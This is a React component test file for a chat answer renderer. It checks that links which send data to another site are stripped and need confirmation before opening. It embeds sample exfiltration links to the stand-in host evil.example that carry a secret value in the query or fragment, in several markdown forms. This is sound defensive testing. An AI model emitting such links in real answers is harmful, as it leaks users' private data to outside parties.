import React from 'react';
import { describe, it, expect, afterEach } from 'vitest';
import { render, cleanup, fireEvent, screen } from '@testing-library/react';
import { Theme } from '@radix-ui/themes';
import { AnswerContent } from '../answer-content';
import type { CitationMaps } from '../response-tabs/citations';
import { linkDataHost, linkWithoutData } from '../../../utils/link-label';

afterEach(cleanup);

const h = React.createElement;

const EMPTY_MAPS: CitationMaps = {
  citations: {},
  sources: {},
  sourcesOrder: [],
  citationsOrder: {},
};

function renderAnswer(content: string, isStreaming = false) {
  return render(
    h(Theme, null, h(AnswerContent, { content, citationMaps: EMPTY_MAPS, isStreaming })),
  );
}

const SECRET = 'q3-revenue-12.4M';
const EXFIL = `https://evil.example/collect?d=${SECRET}`;

function linksTo(container: HTMLElement, needle: string) {
  return Array.from(container.querySelectorAll('a')).filter((a) => (a.getAttribute('href') ?? '').includes(needle));
}

describe('SEC-EG-09: links that carry data to another site need a confirm', () => {
  it.each([
    ['inline link', `[see the report](${EXFIL})`],
    ['raw autolink', `Details: ${EXFIL}`],
    ['angle autolink', `Details: <${EXFIL}>`],
    ['reference-style link', `Read [the report][r].\n\n[r]: ${EXFIL}`],
    ['raw HTML anchor', `<a href="${EXFIL}">the report</a>`],
    ['fragment data', `[report](https://evil.example/page#d=${SECRET})`],
  ])('SEC-EG-09: a %s does not put the data in the clickable address', (_kind, markdown) => {
    const { container } = renderAnswer(markdown);

    expect(linksTo(container, SECRET)).toHaveLength(0);
    const link = container.querySelector('a[data-link-carries-data]');
    expect(link).not.toBeNull();
    expect(link!.getAttribute('href')).toBe('https://evil.example/' + (markdown.includes('/page#') ? 'page' : 'collect'));
    expect(link!.getAttribute('title')).toBe('Sends extra data to evil.example');
    expect(container.textContent).not.toContain(SECRET);
  });

  it('SEC-EG-09: clicking shows who receives the data, and only "Open link" follows the full address', () => {
    const { container } = renderAnswer(`[see the report](${EXFIL})`);
    const link = container.querySelector('a[data-link-carries-data]') as HTMLAnchorElement;

    const notPrevented = fireEvent.click(link);
    expect(notPrevented).toBe(false);

    expect(screen.getByText('This link sends extra data')).toBeTruthy();
    expect(screen.getByText(/passes the information in the address to evil\.example/)).toBeTruthy();
    const open = screen.getByText('Open link').closest('a')!;
    expect(open.getAttribute('href')).toBe(EXFIL);
    expect(open.getAttribute('target')).toBe('_blank');
    expect(open.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('SEC-EG-09: cancel closes the confirm without opening anything', () => {
    const { container } = renderAnswer(`[see the report](${EXFIL})`);
    fireEvent.click(container.querySelector('a[data-link-carries-data]')!);

    fireEvent.click(screen.getByText('Cancel'));

    expect(screen.queryByText('Open link')).toBeNull();
    expect(linksTo(document.body, SECRET)).toHaveLength(0);
  });

  it('SEC-EG-09: flags links while the answer is still streaming', () => {
    const { container } = renderAnswer(`[x](${EXFIL})\n\nmore text`, true);
    expect(linksTo(container, SECRET)).toHaveLength(0);
    expect(container.querySelector('a[data-link-carries-data]')).not.toBeNull();
  });

  it('SEC-EG-09: ordinary links open directly', () => {
    const { container } = renderAnswer(
      [
        '[docs](https://docs.example.com/guide/install)',
        '[section](https://en.wikipedia.org/wiki/Prompt_injection#History)',
        '[quote](https://docs.example.com/page#:~:text=hello%20world)',
        '[mail](mailto:team@example.com)',
        '[home](/chat)',
        `[same origin](${window.location.origin}/knowledge-base?view=all-records)`,
      ].join('\n\n'),
    );

    expect(container.querySelector('a[data-link-carries-data]')).toBeNull();
    const hrefs = Array.from(container.querySelectorAll('a')).map((a) => a.getAttribute('href'));
    expect(hrefs).toEqual(
      expect.arrayContaining([
        'https://docs.example.com/guide/install',
        'https://en.wikipedia.org/wiki/Prompt_injection#History',
        'mailto:team@example.com',
      ]),
    );
    expect(hrefs.some((h) => h?.includes('view=all-records'))).toBe(true);
  });
});

describe('SEC-EG-09: linkDataHost', () => {
  const APP = 'https://app.pipeshub.test';

  it.each([
    [`${APP}/chat?conversationId=1`, null],
    ['/chat?conversationId=1', null],
    ['https://docs.example.com/a/b', null],
    ['https://docs.example.com/a#install', null],
    ['https://docs.example.com/a#:~:text=some%20quote', null],
    ['mailto:a@example.com?body=secret', null],
    ['https://evil.example/?d=secret', 'evil.example'],
    ['https://evil.example/?', null],
    ['//evil.example/x?d=1', 'evil.example'],
    ['https://evil.example/#token=abc', 'evil.example'],
    [`https://evil.example/#${'a'.repeat(80)}`, 'evil.example'],
    ['http://sub.evil.example:8080/p?x=1', 'sub.evil.example'],
  ])('SEC-EG-09: %s -> %s', (href, expected) => {
    expect(linkDataHost(href, APP)).toBe(expected);
  });

  it('SEC-EG-09: linkWithoutData drops query and fragment', () => {
    expect(linkWithoutData('https://evil.example/a/b?d=1#x=2')).toBe('https://evil.example/a/b');
    expect(linkWithoutData('not a url')).toBe('not a url');
  });
});
